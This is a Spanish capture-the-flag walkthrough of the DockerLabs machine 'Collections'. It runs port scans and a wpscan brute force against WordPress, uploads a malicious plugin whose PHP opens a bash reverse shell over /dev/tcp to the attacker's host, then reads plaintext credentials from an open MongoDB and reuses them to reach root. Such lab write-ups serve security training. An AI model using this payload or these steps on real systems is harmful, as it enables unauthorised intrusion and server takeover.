#MAQUINA #DOCKERLABS #MEDIO
#WORDPRESS #WPSCAN 
#MONGODB #MONGOSH
<hr>

# RECONOCIMIENTO

Vamos a resolver **Collections** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 09:43 CET
Initiating ARP Ping Scan at 09:43
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 09:43, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:43
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 27017/tcp on 172.17.0.2
Completed SYN Stealth Scan at 09:43, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-02-17 09:43:20 CET for 0s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 64
80/tcp    open  http    syn-ack ttl 64
27017/tcp open  mongod  syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)




```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene los puertos **80(HTTP)**, **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 09:43 CET
Nmap scan report for gatekeeperhr.com (172.17.0.2)
Host is up (0.000019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 25:3f:a6:b3:1b:a8:dc:e6:ef:0a:51:a7:d6:f4:15:c9 (ECDSA)
|_  256 d1:38:83:b2:33:0d:ad:b6:44:4f:b5:6e:fb:17:08:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.53 seconds



```

```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 09:44 CET
Nmap scan report for gatekeeperhr.com (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds

whatweb "http://172.17.0.2/wordpress/"
http://172.17.0.2/wordpress/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[172.17.0.2], JQuery[3.7.1], MetaGenerator[WordPress 6.5.3], Script[importmap,module], Title[Mi Web Maravillosa], UncommonHeaders[link], WordPress[6.5.3]


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

Tenemos un **wordpress**.

## HTTP (80)

Al revisar la web que hay en el puerto 80, vamos a utilizar **wpscan** :

```bash
wpscan --url "http://172.17.0.2/wordpress/" --enumerate u
[i] User(s) Identified:

[+] chocolate
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

```

```bash
wpscan --url "http://172.17.0.2/wordpress/" -U chocolate --passwords /usr/share/wordlists/rockyou.txt

[!] Valid Combinations Found:
 | Username: chocolate, Password: chocolate


```

# EXPLOTACION

Nos vamos a plugins y subimos y activamos un plugin. Vamos a subir un zip que nos otorgue una reverse shell y nos ponemos en escucha por el puerto 443 (**nc -nlvp 443**).
Contenido del zip, un php con:

   ```bash

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

```

# ESCALADA PRIVILEGIOS

Al hacer un **ps -ef,** vemos que hay un mongo corriendo, vamos a echarle un ojo:

```bash
mongosh
accesos> show dbs
accesos  40.00 KiB
admin    40.00 KiB
config   60.00 KiB
local    40.00 KiB
accesos> use accesos
already on db accesos
accesos> show collections
usuarios
accesos> db.usuarios.find()
[
  {
    _id: ObjectId('6645f4456682cdae1b46b799'),
    nombre: 'dbadmin',
    'contraseña': 'chocolaterequetebueno123'
  }
]

```

YA ESTAMOS COMO DBADMIN.

REUTILIZAMOS CONTRA CON ROOT

**YA ESTAMOS COMO ROOT.**